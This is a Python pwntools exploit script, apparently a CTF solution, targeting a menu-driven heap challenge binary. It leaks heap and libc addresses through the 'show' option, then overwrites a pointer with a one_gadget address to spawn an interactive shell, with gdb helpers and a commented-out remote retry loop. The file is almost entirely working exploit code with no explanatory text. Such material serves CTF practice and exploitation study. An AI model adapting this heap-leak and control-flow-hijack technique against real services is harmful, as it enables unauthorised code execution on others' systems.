#! /usr/bin/env python
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
# Copyright © 2020 wlz <wlz@kyria>
#
# Distributed under terms of the MIT license.

from pwn import * 

pie  = 1
arch = 64
bps  = [0x0000000000015471, 0x000000000001595B, 0x000000000001548F]

def new(idx, name):
    sla("choice:", '0')
    sla("idx:", str(idx))
    sla("name:", name)

def set(idx):
    sla("choice:", '1')
    sla("idx:", str(idx))

def show():
    sla("choice:", '2')

def eat():
    sla("choice:", '3')

def exp():
    new(0, 'a' * 0x780)
    set(0)
    gdba()

def exp1():
    new(0, 'a' * 0x780)
    set(0)
    new(0, 'b' * 0x30)

    # new(0, 'c' * 0x18)
    show()
    ru("name: ")
    re(0x48, 2)
    heap = u64(re(8, 2))
    slog['heap'] = heap
    bheap = heap - 0x13290
    slog['bheap'] = bheap
    unsorted_chunk = 0x13af0 + bheap
    slog['unsorted_chunk'] = unsorted_chunk

    payload = flat(0, unsorted_chunk+0x10, 0x100)
    new(1, payload)

    show()
    ru("name: ")
    while (1):
        main_arean = u64(re(8, 2))
        if main_arean == 0x3a6563696f68630a:
            raise EOFError;
        libc = main_arean - 0x3ebca0
        if (libc & 0xfff == 0):
            break;
    slog['main_arean'] = main_arean 
    slog['libc'] = libc 
    

def exp2():
    one = [0x4f3d5, 0x4f432, 0x10a41c]
    ogg = slog['libc'] + one[1]
    print("one: " + hex(ogg))
    pogg = slog['bheap'] + 0x13a98
    print("poop: " + hex(pogg))

    set(1)
    new(1, 'b' * 0x18)
    new(2, flat(pogg, ogg).ljust(0x18, b'c'))
    eat()




context.os='linux'

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

slog = {'name' : 111}
local = int(sys.argv[1])

if arch==64:
    context.arch='amd64'
if arch==32:
    context.arch='i386'

if local:
    cn = process('./rbin')
    # cn = process(['./ld', './bin'], env={"LD_PRELOAD":"./libc"})
else:
    cn = remote( )

elf = ELF('./bin')

def gdba():
    if local == 0:
        return 0;
    cmd ='set follow-fork-mode parent\n'
    #cmd=''
    if pie:
        base =int(os.popen("pmap {}|grep bin |awk '{{print $1}}'".format(cn.pid)).readlines()[1],16)
        cmd +=''.join(['b *{:#x}\n'.format(b+base) for b in bps])
        cmd +='set $base={:#x}\n'.format(base)
        slog['base'] = base	
    else:
        cmd+=''.join(['b *{:#x}\n'.format(b) for b in bps])
    gdb.attach(cn,cmd)

re  = lambda m, t : cn.recv(numb=m, timeout=t)
recv= lambda      : cn.recv()
ru  = lambda x    : cn.recvuntil(x)
rl  = lambda      : cn.recvline()
sd  = lambda x    : cn.send(x)
sl  = lambda x    : cn.sendline(x)
ia  = lambda      : cn.interactive()
sla = lambda a, b : cn.sendlineafter(a, b)
sa  = lambda a, b : cn.sendafter(a, b)
sll = lambda x    : cn.sendlineafter(':', x)
# after a, send b;
from pwnlib.util import cyclic
ff  = lambda arg, f=cyclic.de_bruijn(), l=None :flat(*arg, filler=f, length=l)

def slog_show():
    for i in slog:
        success(i + ' ==> ' + hex(slog[i]))

'''
while 1:
    try:
        cn = process('./rbin')
        # cn = remote("mc.ax", 31707)
        exp1()
        break
    except EOFError:
        continue

exp2()
'''
exp()


slog_show()

ia()

